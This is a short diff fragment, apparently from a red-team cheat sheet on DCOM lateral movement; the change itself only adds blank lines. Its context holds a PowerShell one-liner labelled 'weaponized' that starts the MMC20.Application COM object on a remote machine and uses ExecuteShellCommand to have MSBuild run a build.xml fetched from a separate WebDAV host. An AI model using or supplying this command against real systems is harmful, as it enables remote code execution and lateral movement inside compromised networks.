@@ -19,3 +19,5 @@ PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Window
 # Weaponized example with MSBuild
 PS C:\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\10.10.10.2\webdav\build.xml","7")
 ```
+
+
